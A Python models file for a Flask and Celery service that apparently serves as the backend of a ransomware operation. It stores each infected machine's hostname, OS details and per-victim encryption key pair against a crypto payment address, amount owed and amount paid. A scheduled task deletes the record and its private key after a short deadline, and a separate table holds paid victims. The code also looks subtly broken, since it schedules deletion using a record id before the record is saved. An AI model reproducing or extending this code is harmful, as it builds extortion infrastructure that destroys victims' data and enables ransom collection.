import pytz
from app import db, app, celery
from datetime import datetime, timedelta, timezone
from werkzeug.security import generate_password_hash, check_password_hash
from flask_login import UserMixin


tz = pytz.timezone('America/Toronto')


@celery.task(bind=True)
def terminate_user(self, user_id):
    with app.app_context():
        user = Users.query.get(user_id)
        if user:
            db.session.delete(user)
            db.session.commit()


class Users(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80))
    hostname = db.Column(db.String(120))
    uid = db.Column(db.String(120), unique=True)
    os_name = db.Column(db.String(120))
    os_version = db.Column(db.String(120))
    os_architecture = db.Column(db.String(120))
    email = db.Column(db.String(120))
    # keys
    public_key = db.Column(db.String(4000))
    private_key = db.Column(db.String(10000))
    # payment details
    crypto_address = db.Column(db.String(120), unique=True, nullable=False)
    total_payment = db.Column(db.Float, nullable=False, default=0.0)
    status = db.Column(db.Boolean, default=False, nullable=False)
    amount_paid = db.Column(db.Float, default=0.0, nullable=False)
    # creation date
    creation_date = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    expiration = db.Column(db.DateTime, nullable=False)

    def __init__(self, username, hostname, uid, os_name, os_version, os_architecture, email, public_key, private_key,
                 crypto_address, total_payment, status, amount_paid):
        self.username = username
        self.hostname = hostname
        self.uid = uid
        self.os_name = os_name
        self.os_version = os_version
        self.os_architecture = os_architecture
        self.email = email
        self.public_key = public_key
        self.private_key = private_key
        self.crypto_address = crypto_address
        self.total_payment = total_payment
        self.status = status
        self.amount_paid = amount_paid

        self.calculate_threshold_time()
        self.schedule_termination()

    def __repr__(self):
        return f'<UID {self.uid}>'

    def calculate_threshold_time(self):
        self.creation_date = datetime.now(tz=tz)
        self.expiration = datetime.now(tz=tz) + timedelta(seconds=30)

    def schedule_termination(self):
        print(f"Scheduling termination for user_id: {self.id}")
        delay = (self.expiration - datetime.now(timezone.utc)).total_seconds()
        terminate_user.apply_async(args=[self.id], countdown=delay)


class UsersPaid(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80))
    hostname = db.Column(db.String(120))
    uid = db.Column(db.String(120), unique=True)
    os_name = db.Column(db.String(120))
    os_version = db.Column(db.String(120))
    os_architecture = db.Column(db.String(120))
    email = db.Column(db.String(120))
    public_key = db.Column(db.String(4000))
    private_key = db.Column(db.String(10000))
    crypto_address = db.Column(db.String(120), unique=True, nullable=False)
    total_payment = db.Column(db.Float, nullable=False, default=0.0)
    status = db.Column(db.Boolean, default=False, nullable=False)
    amount_paid = db.Column(db.Float, default=0.0, nullable=False)
    creation_date = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    payment_date = db.Column(db.DateTime, nullable=False)


class Administrator(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(128), nullable=False)

    def set_password(self, password):
        self.password = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password, password)

    def is_active(self):
        return True



